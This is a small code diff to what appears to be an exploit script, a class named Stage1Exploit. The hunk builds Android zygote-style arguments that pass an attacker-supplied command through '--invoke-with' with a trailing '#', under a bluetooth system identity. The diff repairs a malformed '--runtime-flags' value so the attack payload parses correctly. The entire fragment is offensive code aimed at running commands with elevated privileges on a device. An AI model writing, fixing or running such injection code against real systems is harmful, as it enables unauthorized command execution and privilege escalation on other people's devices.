@@ -197,7 +197,7 @@ class Stage1Exploit:
             "--runtime-args",
             "--nice-name=bluetooth",
             "--seinfo=platform:bluetooth:complete",
-            "--runtime-flags=1"32767,
+            "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
         ]
